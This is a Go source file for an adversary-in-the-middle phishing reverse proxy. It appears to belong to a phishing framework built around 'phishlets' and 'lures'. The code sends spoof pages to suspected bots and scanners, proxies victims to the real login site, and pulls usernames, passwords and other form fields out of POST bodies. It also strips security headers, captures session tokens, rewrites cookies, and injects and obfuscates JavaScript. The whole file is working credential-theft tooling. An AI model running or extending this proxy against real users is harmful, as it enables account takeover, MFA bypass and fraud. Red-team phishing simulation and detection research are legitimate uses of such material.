package proxy

import (
	"bufio"
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"

	"github.com/travisbale/mirage/internal/aitm"
)

// Sentinel errors returned by handleInit to signal how HandleRequest should respond.
var (
	errSpoof     = errors.New("spoof")
	errSpoofLure = errors.New("spoof with lure target")
	errBlock     = errors.New("block")
)

// serve is the HTTP/1.1 keep-alive loop. It reads requests off the
// connection, routes WebSocket/API traffic directly, and dispatches
// phishing requests to handleRequest.
func (c *connection) serve(ctx context.Context) {
	connReader := bufio.NewReader(c.rawConn)

	for {
		req, err := http.ReadRequest(connReader)
		if err != nil {
			if !errors.Is(err, io.EOF) && !isConnReset(err) {
				c.server.Logger.Debug("aitm: reading request", "error", err)
			}

			return
		}

		req = req.WithContext(ctx)
		req.TLS = c.tlsState
		req.URL.Scheme = "https"
		req.RemoteAddr = c.rawConn.RemoteAddr().String()

		// WebSocket upgrade — handle directly, no phishing pipeline needed.
		if isWebSocketUpgrade(req) && strings.HasPrefix(req.URL.Path, "/ws/") {
			sessionID := strings.TrimPrefix(req.URL.Path, "/ws/")
			if sessionID == "" {
				continue
			}

			rec := newHijackableResponseWriter(c.rawConn)
			c.server.WSHub.HandleUpgrade(rec, req, sessionID)

			return
		}

		// API requests — route directly to the API handler.
		if strings.EqualFold(hostWithoutPort(req.Host), c.server.SecretHostname) {
			rec := newBufferedResponseWriter(c.rawConn)
			c.server.APIHandler.ServeHTTP(rec, req)
			rec.flush()

			if !rec.keepAlive {
				return
			}

			continue
		}

		c.handleRequest(req)
	}
}

// handleRequest processes a single HTTP request on this connection.
// All response writing is centralized here — handler methods only make
// decisions or mutate the request/response in place.
func (c *connection) handleRequest(r *http.Request) {
	w := newBufferedResponseWriter(c.rawConn)

	// 0. Connection setup on first request.
	if c.session == nil {
		if err := c.initSession(r); err != nil {
			switch {
			case errors.Is(err, errSpoof):
				c.server.Spoofer.Spoof(w, r)
			case errors.Is(err, errSpoofLure):
				c.server.Spoofer.SpoofTarget(w, r, c.spoofURL())
			case errors.Is(err, errBlock):
				http.Error(w, "Not Found", http.StatusNotFound)
			default:
				c.server.Logger.Error("connection setup failed", "error", err)
				c.server.Spoofer.Spoof(w, r)
			}

			w.flush()
			return
		}
	}

	// 1. Completed session redirect.
	if c.session.IsDone() && c.lure != nil && c.lure.RedirectURL != "" {
		http.Redirect(w, r, c.lure.RedirectURL, http.StatusFound)
		w.flush()

		return
	}

	// 2. Intercept rules.
	if rule := c.matchIntercept(r); rule != nil {
		if rule.ContentType != "" {
			w.Header().Set("Content-Type", rule.ContentType)
		}

		w.WriteHeader(rule.StatusCode)
		if rule.Body != "" {
			if _, err := io.WriteString(w, rule.Body); err != nil {
				c.server.Logger.Warn("failed to write intercept rule body", "error", err)
			}
		}

		w.flush()
		return
	}

	// 3. Lure path rewrite.
	c.rewriteLurePath(r)

	// 4. Telemetry score check (L2 — accumulated telemetry).
	if c.shouldSpoof() {
		c.server.Spoofer.SpoofTarget(w, r, c.spoofURL())
		w.flush()
		return
	}

	// 5. URL rewrite (phishing domain → upstream domain).
	c.rewriteURL(r)

	// 6. Credential extraction.
	c.extractCredentials(r)

	// 7. Force POST injection.
	c.injectForcePost(r)

	// Forward to upstream.
	resp, err := c.forwardRequest(r)
	if err != nil {
		c.server.Logger.Error("upstream request failed", "error", err, "url", r.URL.String())
		http.Error(w, "bad gateway", http.StatusBadGateway)
		w.flush()
		return
	}
	defer resp.Body.Close()

	// Response pipeline.
	c.stripSecurityHeaders(resp)
	c.extractTokens(resp)
	c.rewriteCookies(resp)
	c.applySubFilters(resp)
	c.injectJS(resp)
	c.obfuscateJS(resp)

	// Write upstream response directly to the raw connection.
	if err := resp.Write(c.rawConn); err != nil {
		c.server.Logger.Debug("writing response to victim", "error", err)
	}
}

// initSession performs connection-level setup using the first HTTP request: IP
// extraction, bot detection, blacklist check, phishlet/lure resolution, and
// session creation. Returns a sentinel error (errSpoof, errSpoofLure, errBlock)
// to signal the response type, or a wrapped error for unexpected failures.
func (c *connection) initSession(firstReq *http.Request) error {
	// 1. Extract client IP.
	c.clientIP = extractClientIP(firstReq, c.server.TrustedCIDRs)

	// 2. Bot guard check (L1 — JA4 signature).
	if c.ja4Hash != "" {
		c.botVerdict = c.server.BotGuard.Evaluate(c.ja4Hash, nil)
		if c.botVerdict == aitm.VerdictSpoof {
			return errSpoof
		}

		if c.botVerdict == aitm.VerdictBlock {
			return errBlock
		}
	}

	// 3. Blacklist check.
	if c.server.Blacklist.IsBlocked(c.clientIP) {
		return errSpoof
	}

	// 4. Resolve phishlet + lure from hostname.
	hostname := hostWithoutPort(strings.ToLower(firstReq.Host))
	phishlet, lure, err := c.server.PhishletSvc.ResolveHostname(hostname, firstReq.URL.Path)
	if err != nil {
		return fmt.Errorf("resolving hostname %q: %w", hostname, err)
	}

	if phishlet == nil {
		return errSpoof
	}

	c.phishlet = phishlet
	c.lure = lure

	// 5. Load existing session or validate lure + create new session.
	if cookie, err := firstReq.Cookie(SessionCookieName); err == nil && cookie.Value != "" {
		if sess, err := c.server.SessionSvc.Get(cookie.Value); err == nil {
			c.session = sess
			c.isNewSession = false
		}
	}

	if c.session == nil {
		// New visitor — enforce lure rules before creating a session.
		if lure == nil || lure.IsPaused() || !lure.MatchesUA(firstReq.UserAgent()) {
			return errSpoofLure
		}

		sess, err := c.server.SessionSvc.NewSession(c.clientIP, c.ja4Hash, lure.ID, phishlet.Name)
		if err != nil {
			return fmt.Errorf("creating session: %w", err)
		}
		c.session = sess
		c.isNewSession = true

		c.server.Logger.Info("lure hit",
			"session_id", sess.ID,
			"phishlet", sess.Phishlet,
			"lure_id", sess.LureID,
			"client_ip", c.clientIP,
			"user_agent", firstReq.UserAgent(),
		)
	}

	// 6. Look up puppet override.
	if c.server.PuppetSvc != nil {
		c.puppetOverride = c.server.PuppetSvc.GetOverride(phishlet.Name)
	}

	return nil
}

// matchIntercept returns the first matching intercept rule, or nil.
func (c *connection) matchIntercept(r *http.Request) *aitm.InterceptRule {
	for i := range c.phishlet.Intercepts {
		rule := &c.phishlet.Intercepts[i]
		if !rule.Path.MatchString(r.URL.Path) {
			continue
		}
		if rule.BodySearch != nil {
			body, err := readRequestBody(r)
			if err != nil || !rule.BodySearch.Match(body) {
				continue
			}
		}
		return rule
	}
	return nil
}

func (c *connection) rewriteLurePath(r *http.Request) {
	if c.lure == nil || r.URL.Path != c.lure.Path {
		return
	}

	landingPath := "/"
	if c.phishlet.Login.Path != "" {
		landingPath = c.phishlet.Login.Path
	}
	r.URL.Path = landingPath
}

// shouldSpoof evaluates telemetry scoring and returns true if the
// connection should be spoofed.
func (c *connection) shouldSpoof() bool {
	if c.session == nil {
		return false
	}

	// Once marked as a bot, always spoof.
	if c.botVerdict == aitm.VerdictSpoof {
		return true
	}

	if c.botVerdict != aitm.VerdictAllow {
		return false
	}

	botScore := c.server.TelemetryScore.ScoreSession(c.session.ID)
	c.session.BotScore = botScore
	if botScore > c.server.ScoreThreshold {
		c.botVerdict = aitm.VerdictSpoof
		return true
	}

	return false
}

func (c *connection) rewriteURL(r *http.Request) {
	if ph := c.phishlet.FindProxyHost(r.Host); ph != nil {
		origin := ph.OriginHost()
		r.Host = origin
		r.URL.Host = origin
		r.URL.Scheme = ph.UpstreamScheme
	}

	rewriteHeader(r, "Origin", c.phishlet)
	rewriteHeader(r, "Referer", c.phishlet)
	stripCookie(r, SessionCookieName)
}

func (c *connection) extractCredentials(r *http.Request) {
	if c.session == nil || r.Method != http.MethodPost {
		return
	}

	login := c.phishlet.Login
	if login.Domain != "" && !strings.HasSuffix(strings.ToLower(hostWithoutPort(r.Host)), strings.ToLower(login.Domain)) {
		return
	}

	body, err := readRequestBody(r)
	if err != nil || len(body) == 0 {
		return
	}

	updated := false
	rules := c.phishlet.Credentials

	if username := extractField(rules.Username, body); username != "" && c.session.Username == "" {
		c.session.Username = username
		updated = true
	}

	if password := extractField(rules.Password, body); password != "" && c.session.Password == "" {
		c.session.Password = password
		updated = true
	}

	for _, customRule := range rules.Custom {
		if value := extractField(customRule.CredentialRule, body); value != "" {
			if c.session.Custom == nil {
				c.session.Custom = make(map[string]string)
			}
			c.session.Custom[customRule.Name] = value
			updated = true
		}
	}

	if updated {
		if err := c.server.SessionSvc.CaptureCredentials(c.session); err != nil {
			c.server.Logger.Warn("failed to persist captured credentials", "session_id", c.session.ID, "error", err)
		} else {
			c.server.Logger.Info("credentials captured",
				"session_id", c.session.ID,
				"phishlet", c.session.Phishlet,
				"username", c.session.Username,
			)
		}
	}
}

func (c *connection) injectForcePost(r *http.Request) {
	if r.Method != http.MethodPost {
		return
	}

	for _, forcePost := range c.phishlet.ForcePosts {
		if !forcePost.Path.MatchString(r.URL.Path) {
			continue
		}

		body, err := readRequestBody(r)
		if err != nil {
			c.server.Logger.Error("failed to read request body for force_post", "path", r.URL.Path, "error", err)
			continue
		}

		if !checkForcePostConditions(forcePost.Conditions, body) {
			continue
		}

		modified := injectFormParams(body, forcePost.Params)
		r.Body = io.NopCloser(bytes.NewReader(modified))
		r.ContentLength = int64(len(modified))
		r.Header.Set("Content-Length", strconv.Itoa(len(modified)))
	}
}

func (c *connection) forwardRequest(req *http.Request) (*http.Response, error) {
	upstreamReq := req.Clone(req.Context())
	upstreamReq.RequestURI = ""
	if upstreamReq.URL.Host == "" {
		upstreamReq.URL.Host = req.Host
	}

	resp, err := c.server.upstreamClient.Do(upstreamReq)
	if err != nil {
		return nil, fmt.Errorf("upstream request: %w", err)
	}

	// Tag with the original request so sub-filter hostname matching works.
	resp.Request = req

	return resp, nil
}
